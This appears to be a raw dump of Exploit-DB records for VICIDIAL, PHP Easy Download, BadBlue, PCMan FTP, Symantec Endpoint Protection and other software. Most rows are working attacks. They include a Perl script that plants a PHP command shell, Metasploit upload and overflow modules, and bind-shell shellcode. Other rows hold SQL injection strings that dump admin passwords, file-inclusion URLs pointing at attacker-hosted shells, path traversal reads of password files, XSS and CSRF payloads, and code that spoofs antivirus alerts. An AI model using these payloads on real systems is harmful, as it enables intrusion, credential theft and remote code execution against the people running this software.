spl:Z.Khodaee  ------- exploit:  http://site.com/AST_agent_time_sheet.php?agent=some-agent' and sleep(15)='&calls_summary=1&query_date=2012-09-07 http://site.com/AST_timeonVDADall.php?adastats=1&DB=0&groups[]=1345' and sleep(15)='&RR=4 http://site.com/vicidial_demo/user_stats.php?user=2000' and sleep(10)='  ---- Sepahan TelCom Network And Security Group (septelcom)  www.septelcom.net  E-mail: amirhadi.yazdani@gmail.com,info@septelcom.net     ####################################################################################   #                                                                                  #   #     ...:::::VICIDIAL call center suite XSS/HTTP Prameter pollution::::....       #            ####################################################################################                                     Sepahan TelCom IT Group (septelcom) 								       ------------------------------------------------------- # Date: 2012-09-07 # Exploit Author: Sepahan TelCom IT Group (septelcom) # Vendor Homepage: http://www.vicidial.org # Software Link: https://sourceforge.net/project/showfiles.php?group_id=95133&package_id=101320 #Affected version: <=2.2.1-237  									   VICIDIAL is a set of programs that are designed to interact with the Asterisk Open-Source PBX Phone system to act as a complete inbound/outbound call center suite. --------------------------------------------------------  									   I'M hadihadi From Virangar Security Team  special tnx to:MR.nosrati,black.shadowes,MR.hesy & all virangar members & all hackerz  greetz to My best friends & partners in septelcom group : Reza Kazemian,Hossein Ghasemi  spl:Z.Khodaee  ------- exploit:  XSS :  http://site.com/admin_search_lead.php?alt_phone_search=&DB=1&first_name=lskkuuaj&last_name=lskkuuaj&lead_id=1&list_id=1&log_lead_id=1&log_phone=555-666-0606&phone=555-666-0606&status=1&submit=SUBMIT&user=[XSS]&vendor_id=1 http://site.com/user_stats.php?user=[XSS] -------------- HTTP Prameter plution:  http://site.com/./user_stats.php?user=shtuasvb&begin_date=2012-09-07&end_date=2012-09-07{HTPP} example : /user_stats.php?user=shtuasvb&begin_date=2012-09-07&end_date=2012-09-07&hadi685=sep148  http://site.com/admin.php?ADD=3&user=someuser{HTPP} example : ./admin.php?ADD=3&user=hadi&sep18=tell15  ---- Sepahan TelCom Network And Security Group (septelcom)  www.septelcom.net  E-mail: amirhadi.yazdani@gmail.com,info@septelcom.net",remote,webapps,1
4481,"Poppawid 2.7 - 'form' Remote File Inclusion #Poppawid Remote File include #f0und bY 0in #Greetings to: All Dark-Coders Team Members #IRC: #dark-coders at warszawa.irc.pl #About:popper_mod-wid is a free (and popular), full featured web based email client #Download:http://poppawid.sourceforge.net/ #No dork for script kiddies..;] #Register_globals=On #BUG: poppawid/mail/childwindow.inc.php:33:                                   <?php include($form."".form.inc.php"");?> Expl0it: http://x.com/[path]/mail/childwindow.inc.php?form=http://h4x0r.org/shell.txt?  # milw0rm.com [2007-10-02]",remote,webapps,1
2812,"PHP Easy Downloader 1.5 - 'save.php' Remote Code Execution #!/usr/bin/perl # +------------------------------------------------------------------------------------------- # + PHP Easy Download <= 1.5 Remote Code Execution Vulnerability # +------------------------------------------------------------------------------------------- # + Affected Software .: PHP Easy Download <= 1.5 # + Vendor ............: http://www.ironclad.net/ # + Download ..........: http://ironclad.net/scripts/PHP_Easy_Download.zip # + Description .......: ""PHP Easy Download is an easy to use and convenient download script"" # + Dork ..............: ""PHP Easy Downloader"" # + Class .............: Remote Code Execution # + Risk ..............: High (Remote Code Execution) # + Found By ..........: nuffsaid <nuffsaid[at]newbslove.us> # +------------------------------------------------------------------------------------------- # + Details: # + PHP Easy Download by default installation doesn't prevent any of the files in the # + file_info/admin directory from being accessed by a client. The file_info/admin/save.php # + file takes input passed to the script by $_POST and writes it to $_POST[""filename""].0 # + unsanatized in the file_info/admin/descriptions directory. # + # + Vulnerable Code:  # + file_info/admin/save.php, line(s) 14-36: # + -> 14: $filename = $_POST[""filename""]; # + -> 15: $description = $_POST[""description""]; # + -> 20: $path = ""../descriptions/$filename.0""; # + -> 30: $content = ""$accesses|$description|$moreinfo|$date""; # + -> 34: $newfile = fopen($path,""w""); # + -> 35: fwrite($newfile, $content); # + -> 36: fclose($newfile); # +  # + Solution: # + Prevent users from accessing any of the files in the file_info directory (htaccess). # +-------------------------------------------------------------------------------------------  use Getopt::Long; use URI::Escape; use IO::Socket;  $code = ""<?php passthru(\$_GET[cmd]); ?>"";  main();  sub usage {     print ""\nPHP Easy Download <= 1.5 Remote Code Execution Exploit\n"";     print ""-h, --host\ttarget host\t(example.com)\n"";     print ""-f, --file\tshell file\t(shell.php)\n"";     print ""-d, --dir\tinstall dir\t(/file_info)\n"";     exit; }  sub main {     GetOptions ('h|host=s' => \$host,'f|file=s' => \$file,'d|dir=s' => \$dir);     usage() unless $host;          $dir = ""/file_info"" unless $dir;     $file = ""shell.php"" unless $file;     uri_escape($cmd);     $sock = IO::Socket::INET->new(Proto=>""tcp"",PeerAddr=>""$host"",PeerPort=>""80"")      or die ""\nconnect() failed.\n"";          print ""\nconnected to "".$host."", sending data.\n"";     $sendurl = ""description=0&moreinfo="".$code.""&accesses=0&filename="".$file.""&date=&B1=Submit"";     $sendlen = length($sendurl);     print $sock ""POST "".$dir.""/admin/save.php HTTP/1.1\n"";     print $sock ""Host: "".$host.""\n"";     print $sock ""Connection: close\n"";     print $sock ""Content-Type: application/x-www-form-urlencoded\n"";     print $sock ""Content-Length: "".$sendlen.""\n\n"";     print $sock $sendurl;     print ""attempted to create php shell, server response:\n\n"";     while($recvd = <$sock>)     {         print "" "".$recvd."""";     }          while($cmd !~ ""~quit"")     {         print ""\n\n-> "";         $cmd = <STDIN>;         if ($cmd !~ ""~quit"")         {           $sock = IO::Socket::INET->new(Proto=>""tcp"",PeerAddr=>""$host"",PeerPort=>""80"")            or die ""connect() failed.\n"";           $sendurl = uri_escape($cmd);                      print $sock ""GET "".$dir.""/descriptions/"".$file."".0?cmd="".$sendurl."" HTTP/1.1\n"";           print $sock ""Host: "".$host.""\n"";           print $sock ""Accept: */*\n"";           print $sock ""Connection: close\n\n"";           print ""\n"";                      while($recvd = <$sock>)           {               print $recvd;           }         }     }     exit; }  # milw0rm.com [2006-11-18]",remote,webapps,1
12865,"Motorola Surfboard Cable Modem - Directory Traversal # Exploit Title: Motorola SURFBoard Cable Modem Directory Traversal # Date: 2010.06.03 # Author: S2 Crew [Hungary] # Software Link: - # Version: Model name: SBV6120E, Firmware Name: SBV6X2X-1.0.0.5-SCM-02-SHPC # Tested on: ^ # CVE: - # Code :  The following urls get back the /etc/passwd file from the modem:  http://[IP]///etc/passwd <http://[ip]///etc/passwd> http://[IP]/../../etc/passwd  http://[IP]/..%2f..%2fetc/passwd <http://[ip]/..%2f..%2fetc/passwd> http://[IP]/%2e%2e/%2e%2e/etc/passwd",remote,remote,1
23652,"WordPress Plugin Asset-Manager - Arbitrary '.PHP' File Upload (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##  require 'msf/core' require 'msf/core/exploit/php_exe'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient 	include Msf::Exploit::PhpEXE  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'WordPress Asset-Manager PHP File Upload Vulnerability', 			'Description'    => %q{ 				This module exploits a vulnerability found in Asset-Manager <= 2.0	WordPress 				plugin.  By abusing the upload.php file, a malicious user can upload a file to a 				temp directory without authentication, which results in arbitrary code execution. 			}, 			'Author'         => 				[ 					'Sammy FORGIT', # initial discovery 					'James Fitts <fitts.james[at]gmail.com>' # metasploit module 				], 			'License'        => MSF_LICENSE, 			'References'     => 				[ 					[ 'OSVDB', '82653' ], 					[ 'BID', '53809' ], 					[ 'EDB', '18993' ], 					[ 'URL', 'http://www.opensyscom.fr/Actualites/wordpress-plugins-asset-manager-shell-upload-vulnerability.html' ] 				], 			'Payload'	     => 				{ 					'BadChars' => ""\x00"", 				}, 			'Platform'       => 'php', 			'Arch'           => ARCH_PHP, 			'Targets'        => 				[ 					[ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ], 					[ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ] 				], 			'DefaultTarget' => 0, 			'DisclosureDate' => 'May 26 2012'))  		register_options( 			[ 				OptString.new('TARGETURI', [true, 'The full URI path to WordPress', '/wordpress']) 			], self.class) 	end  	def exploit 		uri =  target_uri.path 		uri << '/' if uri[-1,1] != '/' 		peer = ""#{rhost}:#{rport}"" 		payload_name = ""#{rand_text_alpha(5)}.php"" 		php_payload = get_write_exec_payload(:unlink_self=>true)  		data = Rex::MIME::Message.new 		data.add_part(php_payload, ""application/octet-stream"", nil, ""form-data; name=\""Filedata\""; filename=\""#{payload_name}\"""") 		post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')  		print_status(""#{peer} - Uploading payload #{payload_name}"") 		res = send_request_cgi({ 			'method'  => 'POST', 			'uri'     => ""#{uri}wp-content/plugins/asset-manager/upload.php"", 			'ctype'   => ""multipart/form-data; boundary=#{data.bound}"", 			'data'    => post_data 		})  		if not res or res.code != 200 or res.body !~ /#{payload_name}/ 			fail_with(Exploit::Failure::UnexpectedReply, ""#{peer} - Upload failed"") 		end  		print_status(""#{peer} - Executing payload #{payload_name}"") 		res = send_request_raw({ 			'uri'     => ""#{uri}wp-content/uploads/assets/temp/#{payload_name}"", 			'method'  => 'GET' 		})  		if res and res.code != 200 			fail_with(Exploit::Failure::UnexpectedReply, ""#{peer} - Execution failed"") 		end 	end end",remote,remote,1
12496,"KubeBlog - Cross-Site Request Forgery ======================================================================================== | # Title    : KubeBlog XSRF Vuln. | # Author   : The.Morpheus | # email    : fats0L@windowslive.com | # Home     : http://www.spyturks.com | # Date     : 03.05.2010 | # Script   : Copyright © 2008 Kubelabs.com  All Rights Reserved | # Tested on: http://demos.kubelabs.com/kubeblog | # Bug      : Yeni User Eklenebilinir. ======================      Exploit By The.Morpheus  =================================  # Exploit  :   <form name=""form1"" method=""post"" action=""http://[vuln_site]/kubeblog/adm/users_add.php"">         <table width=""70%"" cellpadding=""0"" cellspacing=""2"" border=""0"">           <tr>             <td width=""35%""> </td>             <td width=""65%""> </td>            </tr>           <tr>             <td><strong>Username (<a href=""#"" onClick=""MM_openBrWindow('help.php?id=6','help','width=500,height=200')"">?</a>)</strong></td>             <td>:<input name=""username"" type=""Text"" class=""textbox"" id=""username"" style=""width:60%"" value=""""><span class=""error""></span></td>           </tr>           <tr>             <td><strong>Password (<a href=""#"" onClick=""MM_openBrWindow('help.php?id=7','help','width=500,height=200')"">?</a>)</strong></td>              <td>:<input name=""password"" type=""password"" class=""textbox"" id=""password"" style=""width:60%"" value=""""><span class=""error""></span></td>           </tr>           <tr>             <td><strong>Confirm Password (<a href=""#"" onClick=""MM_openBrWindow('help.php?id=8','help','width=500,height=200')"">?</a>)</strong></td>             <td>:<input name=""password2"" type=""password"" class=""textbox"" id=""password2"" style=""width:60%"" value=""""></td>           </tr>            <tr>             <td><strong>User Type (<a href=""#"" onClick=""MM_openBrWindow('help.php?id=9','help','width=500,height=200')"">?</a>)</strong></td>             <td>:             <select name=""user_type"">             <option value='2'>User</option><option value='3'>Administrator</option><option value='4'>Moderator</option>            </select>             </td>            </tr>           <tr>             <td> </td>             <td> </td>           </tr>           <tr>             <td></td>             <td height=""30"" style=""padding-left:6px;"">             <input name=""Submit"" type=""submit"" class=""button"" value=""Submit"">                            <input name=""Reset"" type=""reset"" class=""button"" value=""Reset"">             </td>           </tr>         </table>     </form></td>   ############################################################################################",remote,webapps,1
16761,"BadBlue 2.5 - 'ext.dll' Remote Buffer Overflow (Metasploit) ## # $Id: badblue_ext_overflow.rb 9719 2010-07-07 17:38:59Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	# NOTE: BadBlue doesn't give any HTTP headers when requesting '/'. 	# However, a proper Server header is returned when requesting /index.html or using HEAD. 	HttpFingerprint = { :method => 'HEAD', :pattern => [ /BadBlue\// ] }  	include Msf::Exploit::Remote::HttpClient 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'BadBlue 2.5 EXT.dll Buffer Overflow', 			'Description'    => %q{ 				This is a stack buffer overflow exploit for BadBlue version 2.5. 			}, 			'Author'         => 'acaro <acaro [at] jervus.it>', 			'License'        => BSD_LICENSE, 			'Version'        => '$Revision: 9719 $', 			'References'     => 				[ 					[ 'CVE', '2005-0595' ], 					[ 'OSVDB', '14238' ], 					[ 'BID', '7387' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Privileged'     => true, 			'Payload'        => 				{ 					'Space'    => 500, 					'BadChars' => ""\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c"", 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					['BadBlue 2.5 (Universal)', { 'Ret' => 0x1003d9da }], 				], 			'DisclosureDate' => 'Apr 20 2003', 			'DefaultTarget'  => 0)) 	end  	def check 		info = http_fingerprint  # check method 		if (info =~ /BadBlue\/2\.5/) 			return Exploit::CheckCode::Vulnerable 		end 		Exploit::CheckCode::Safe 	end  	def exploit 		uri     = ""GET /ext.dll?mfcisapicommand="" 		sploit  = rand_text_alphanumeric(500) 		seh     = generate_seh_payload(target.ret) 		sploit[492, seh.length] = seh 		uri << sploit  		print_status(""Trying target #{target.name}..."") 		send_request_raw({ 'uri' => uri })  		handler 	end  end",remote,remote,1
25755,ServersCheck 5.9/5.10 - Directory Traversal source: https://www.securityfocus.com/bid/13810/info  ServersCheck is affected by a directory traversal vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to disclose arbitrary files on an affected computer in the context of the affected application. This may aid in further attacks against the underlying system.   http://www.example.com:1272/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini http://www.example.com:1272/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini http://www.example.com:1272/..%2F..%2F..%2F..%2F..%2F../windows/repair/sam http://www.example.com:1272/.../.../.../.../.../.../.../.../.../boot.ini http://www.example.com:1272/../../ ../../../../../../../boot.ini http://www.example.com:1272/../../../../../../../../boot.ini http://www.example.com:1272/../../../../boot.ini,remote,remote,1
32708,"Plunet BusinessManager 4.1 - '/pagesUTF8/auftrag_allgemeinauftrag.jsp' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/33153/info  Plunet BusinessManager is prone to multiple security-bypass and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, control how the site is rendered to the user, or perform unauthorized actions as another user; other attacks may also be possible.  Versions prior to BusinessManager 4.2 are vulnerable.  POST /pagesUTF8/auftrag_allgemeinauftrag.jsp HTTP/1.1 Host: <HOSTNAME> or IP User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16)  Gecko/20080718 Ubuntu/8.04 (hardy) Firefox/2.0.0.16 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 300 Proxy-Connection: keep-alive Referer: http://www.example.com/pagesUTF8/auftrag_allgemeinauftrag.jsp Cookie: JSESSIONID=0B1347DFFD031E6BC1944C381A31293D Content-Type: application/x-www-form-urlencoded Content-Length: 1085  TokenUAID=42&QUK=1449&QUKA=*&QUKANSCH=820&QUKLIEFANSCH=820&QUZ=sample& VorlageID=3&QU02=1-&QUL=sample&QUB=%22%3E%3Cscript%3Ealert%28%22XSS2%22%29 %3B%3C%2Fscript%3E&QUG=sample&OSPK01=141&OSPK02=0&OSSK05=&OSSK09=1&PJ12=14 &DATAUFTT=07&DATAUFMM=01&DATAUFJJJJ=2008&DATLIEFTT=24&DATLIEFMM=01& DATLIEFJJJJ=2008&DATLIEFHH=&DATLIEFMN=&PJ13=& Bez74=%22%3E%3Cscript%3Ealert%28%22XSS4%22%29%3B%3C%2Fscript%3E& LDate74TT=24&LDate74MM=01&LDate74JJJJ=2008&LDate74HH=13& LDate74MN=00&BOXP74=4&REA01774=59&REA01874=sample& OutPE0174=0&OutPAP74=8385&Bem74=sample&REA001=&REA010=&REA007=1&REA008=2& REA011=0&REA013=0&REA015=0&LEISTung=sample&LangFlag=&exit=&SelectTab= &ContentBox=&OpenContentBox=&LoginPressed=false&SaveButton=true& CheckXYZ=Send&yOffsetScroll=0",remote,webapps,1
12272,"PHP RapidKill Pro 5.x - Arbitrary File Upload # Exploit Title: PHP RapidKill Pro 5.x Shell Upload Vulnerability  # Date: 16.04.2010  # Author: DigitALL  # Software Link:  # Code :  g00gle d0rk: ""PHP RapidKill Pro""  3xpl0it: Link to Download: http://site.com/shell.txt [r57 or DigitALL Shell ]  And Click To ""F&#304;LES"" And Action Rename xx.php  Then Click The Go To Shell  Greetz To: Efe KroNicKq NoFearx38 and All 1923Turk.Com Members  [ www.digitallsecurity.org ] [ www.1923turk.com ] [ www.digit4ll.blogspot.com ] [ www.kankardes.com ] [ www.hacker-zone.org ]",remote,webapps,1
36487,WordPress Plugin Comment Rating 2.9.20 - 'path' Cross-Site Scripting source: https://www.securityfocus.com/bid/51241/info  The Comment Rating plugin for WordPress is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input.  An attacker could leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This could allow the attacker to steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/wp-content/plugins/comment-rating/ck-processkarma.php?id=[Integer Value]&action=add&path=<script>alert('Founded by TheEvilThinker')</script>&imgIndex=,remote,webapps,1
26288,Mozilla Browser/Firefox - Arbitrary Command Execution source: https://www.securityfocus.com/bid/14888/info  Mozilla Browser/Firefox are affected by an arbitrary command-execution vulnerability.  This attack would occur in the context of the user running the vulnerable application and may facilitate unauthorized remote access.  Mozilla Firefox 1.0.6 running on UNIX-based platforms is reportedly vulnerable. Other versions and applications employing Firefox functionality may be vulnerable as well.  Mozilla Browser 1.7.x versions and Thunderbird 1.x versions are also vulnerable to this issue.   http://local\`find\`host,remote,remote,1
34656,x10 MP3 Automatic Search Engine 1.6.5 - '/includes/video_ad.php?pic_id' Cross-Site Scripting source: https://www.securityfocus.com/bid/43336/info  x10 Media Automatic MP3 Search Engine is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  x10 Media Automatic MP3 Search Engine 1.6.5 is vulnerable; other versions may also be affected.   http://www.example.com/includes/video_ad.php?pic_id=[XSS],remote,webapps,1
37731,"PCMan FTP Server 2.0.7 - 'PUT' Remote Buffer Overflow #!/usr/bin/python # title: PCMan FTP Server v2.0.7 Buffer Overflow - PUT Command # author: @shipcod3 (Jay Turla) # nc <host> 9988 # Tested on Windows XP Service Pack 3 - English # description: Buffer overflow is triggered upon sending long string using the command PUT to PCMAN FTP 2.07    import socket import sys  # msfpayload windows/shell_bind_tcp LPORT=9988 R| msfencode -b '\x00\x0A\x0D' -t c shellcode = ( ""\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"" ""\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x22\x2e\x85\xe9\xa2\x27"" ""\x66\x12\x32\x58\xee\xf7\x03\x4a\x94\x7c\x31\x5a\xde\xd1\xb9"" ""\x11\xb2\xc1\x4a\x57\x1b\xe5\xfb\xd2\x7d\xc8\xfc\xd2\x41\x86"" ""\x3e\x74\x3e\xd5\x12\x56\x7f\x16\x67\x97\xb8\x4b\x87\xc5\x11"" ""\x07\x35\xfa\x16\x55\x85\xfb\xf8\xd1\xb5\x83\x7d\x25\x41\x3e"" ""\x7f\x76\xf9\x35\x37\x6e\x72\x11\xe8\x8f\x57\x41\xd4\xc6\xdc"" ""\xb2\xae\xd8\x34\x8b\x4f\xeb\x78\x40\x6e\xc3\x75\x98\xb6\xe4"" ""\x65\xef\xcc\x16\x18\xe8\x16\x64\xc6\x7d\x8b\xce\x8d\x26\x6f"" ""\xee\x42\xb0\xe4\xfc\x2f\xb6\xa3\xe0\xae\x1b\xd8\x1d\x3b\x9a"" ""\x0f\x94\x7f\xb9\x8b\xfc\x24\xa0\x8a\x58\x8b\xdd\xcd\x05\x74"" ""\x78\x85\xa4\x61\xfa\xc4\xa0\x46\x31\xf7\x30\xc0\x42\x84\x02"" ""\x4f\xf9\x02\x2f\x18\x27\xd4\x50\x33\x9f\x4a\xaf\xbb\xe0\x43"" ""\x74\xef\xb0\xfb\x5d\x8f\x5a\xfc\x62\x5a\xcc\xac\xcc\x34\xad"" ""\x1c\xad\xe4\x45\x77\x22\xdb\x76\x78\xe8\x6a\xb1\xb6\xc8\x3f"" ""\x56\xbb\xee\x98\xa2\x32\x08\x8c\xba\x12\x82\x38\x79\x41\x1b"" ""\xdf\x82\xa3\x37\x48\x15\xfb\x51\x4e\x1a\xfc\x77\xfd\xb7\x54"" ""\x10\x75\xd4\x60\x01\x8a\xf1\xc0\x48\xb3\x92\x9b\x24\x76\x02"" ""\x9b\x6c\xe0\xa7\x0e\xeb\xf0\xae\x32\xa4\xa7\xe7\x85\xbd\x2d"" ""\x1a\xbf\x17\x53\xe7\x59\x5f\xd7\x3c\x9a\x5e\xd6\xb1\xa6\x44"" ""\xc8\x0f\x26\xc1\xbc\xdf\x71\x9f\x6a\xa6\x2b\x51\xc4\x70\x87"" ""\x3b\x80\x05\xeb\xfb\xd6\x09\x26\x8a\x36\xbb\x9f\xcb\x49\x74"" ""\x48\xdc\x32\x68\xe8\x23\xe9\x28\x18\x6e\xb3\x19\xb1\x37\x26"" ""\x18\xdc\xc7\x9d\x5f\xd9\x4b\x17\x20\x1e\x53\x52\x25\x5a\xd3"" ""\x8f\x57\xf3\xb6\xaf\xc4\xf4\x92"")   buffer = ""\x90"" * 30 + shellcode  #77c35459 : push esp # ret  |  {PAGE_EXECUTE_READ} [msvcrt.dll] evil = ""A""*2008 + ""\x59\x54\xC3\x77"" + buffer + ""C""*(888-len(buffer))   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect=s.connect((raw_input('Enter Host:'),21))   s.recv(1024) s.send('USER anonymous\r\n') s.recv(1024) s.send('PASS anonymous\r\n') s.recv(1024) s.send('PUT ' + evil + '\r\n') s.recv(1024) s.send('QUIT\r\n') s.close",remote,remote,1
43134,"Symantec Endpoint Protection 12.1 - Tamper-Protection Bypass [+] Credits: John Page a.k.a hyp3rlinx	 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/CVE-2017-6331-SYMANTEC-ENDPOINT-PROTECTION-TAMPER-PROTECTION-BYPASS.txt [+] ISR: ApparitionSec                 Vendor: ======= www.symantec.com    Product: =========== Symantec Endpoint Protection v12.1.6 (12.1 RU6 MP5)  Symantec 12.1.7004.6500     Vulnerability Type: =================== Tamper-Protection Bypass Denial Of Service / Message Spoof    CVE Reference: ============== CVE-2017-6331 SSG16-041    Security Issue: ================ Symantec Endpoint Protection (SEP), does not validate where WinAPI messages comes from (lack of UIPI). Therefore, malware can easily spoof messages to the UI or send WM_SYSCOMMAND to close the SEP UI denying end user ability to scan / run the EP AntiVirus protection. Spoofed messages could also potentially inform a user a scan was clean.  Unfortunately Symantecs advisory left out details of the Denial Of Service as well as minimizing the amount of text a malware could inject into the UI which would result in compromising the integrity of the Symantec Endpoint Protection Control Panel user interface.    References: =========== https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20171106_00     Exploit/POC: =============   1) Compile below C program, it targets various components of SEP, comment out what you want to send to the UI.  2) Try to open the Symantec Endpoint UI and you will be denied. 3) Or inject attacker supplied messages intructing the user the file is clean etc.   #include <windows.h> #include <Tlhelp32.h> #define VICTIM ""DevViewer.exe""  //By HYP3RLINX //ISR: ApparitionSec //Symantec EP Protection - Tamper Protection Bypass Vulnerability //Tested successfully on Symantec 12.1.6 (12.1 RU6 MP5) build 7004 Symantec 12.1.7004.6500 Windows 7  //How: FindWindow / SendMessage Win32 API  //Impact: DOS / Integrity Compromised //TO-DO: Get Window text for SavUI.exe and DOS to prevent AV scans.  void main(void){      while(1){                 HWND hWnd = FindWindow( NULL, TEXT(""Status - Symantec Endpoint Protection""));        if(hWnd!=NULL){      //This injects arbitrary messages to SEP UI.      SetWindowText(hWnd, ""*** Important Security Update, Visit: http://PWN3D.com/EVIL.exe download and follow instructions. ***"");      //This prevents a user from being able to run AV scans and renders SEP UI useless     //SendMessage(hWnd, WM_SYSCOMMAND, SC_CLOSE, 0);       }          //HWND savUI = FindWindowEx(0, 0, ""Symantec Endpoint Protection"", 0);        HWND x = FindWindow(NULL, TEXT(""DevViewer""));    if(x!=NULL){      SendMessage(x, WM_SYSCOMMAND, SC_CLOSE, 0);      }       HWND x2 = FindWindow(NULL, TEXT(""DoScan Help""));    SendMessage(x2, WM_SYSCOMMAND, SC_CLOSE, 0);      HWND x3 = FindWindow(NULL, TEXT(""Sylink Drop""));    SendMessage(x3, WM_SYSCOMMAND, SC_CLOSE, 0);         HWND x4 = FindWindow(NULL, TEXT(""Manual Scan started on 7/8/2016""));    if(x!=NULL){      SendMessage(x4, WM_SYSCOMMAND, SC_CLOSE, 0);      }       sleep(1);        }   }   Network Access: =============== Local     Severity: ========= Medium    Disclosure Timeline: ============================= Vendor Notification: July 8, 2016 Vendor acknowledged: 7/14/16 Vendor advisory : November 6, 2017 November 10, 2017  : Public Disclosure    [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content (c).  hyp3rlinx",local,local,1
41521,"Advanced Matrimonial Script 2.0.3 - SQL Injection # # # # #  # Exploit Title: Advanced Matrimonial Script v2.0.3 - SQL Injection # Google Dork: N/A # Date: 06.03.2017 # Vendor Homepage: http://www.phpscriptsmall.com/ # Software : http://www.phpscriptsmall.com/product/advanced-matrimonial/ # Demo: http://74.124.215.220/~admatrimon/ # Version: 2.0.3 # Tested on: Win7 x64, Kali Linux x64 # # # # #  # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[@]ihsan[.]net # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/photoalbum.php?userid=[SQL] # http://localhost/[PATH]/members_result.php?match_result=[SQL] # http://localhost/[PATH]/search_result.php?cityse=Basic+Search&gender=Male&age_from=[SQL]&marital=[SQL]&religion=[SQL]&caste=[SQL]&country=[SQL]&education=[SQL]&Submit=Search # For example; # photoalbum.php?userid=-22'+/*!50000union*/+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),86,87,88,89-- - # status:adminlogin # admin_id:adminlogin # admin_username:adminlogin # admin_password:adminlogin # admin_email:adminlogin # photoalbum.php?userid=-22'+/*!50000union*/+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,/*!50000concat(*/admin_username,/*!50000char*/(58),admin_password),86,87,88,89+from+adminlogin-- - # <input type=""hidden"" name=""userid"" value=""admin:inetsol"" /> # <input type=""hidden"" name=""userid"" value=""raj:123456"" /> # <input type=""hidden"" name=""userid"" value=""sath:123456"" /> # Etc... Etc... # # # # #",remote,webapps,1
2474,"JAF CMS 4.0 RC1 - Multiple Remote File Inclusions #=========================================================================================== #JAF CMS Remote file include (website) #=========================================================================================== # #Script name : JAF CMS # #Version : 4.0 # #=========================================================================================== #Vulnerable Code : # # if(isset($category) || isset($id)) { include($website.$main_dir.""forum.php""); return;} # #=========================================================================================== #Dork : powered by JAF CMS © 2004 - 2006 # #Exploit : #(1) #http://www.site.com/[jmf_path]/module/forum/main.php?id=1&main_dir=http://www.milw0rm.com/index.php?& #(2) #http://www.site.com/[jmf_path]/module/forum/headlines.php?id=1&main_dir=http://www.milw0rm.com/index.php?& # #=========================================================================================== # #Discoverd By : ThE TiGeR # #Contact : miro_tiger100[at]hotmail[dot]com # #===========================================================================================  /*  * modified the authors GET request from  * ?website=http://www.site.com/shell.txt?  * to the current. /str0ke  */  # milw0rm.com [2006-10-04]",remote,webapps,1
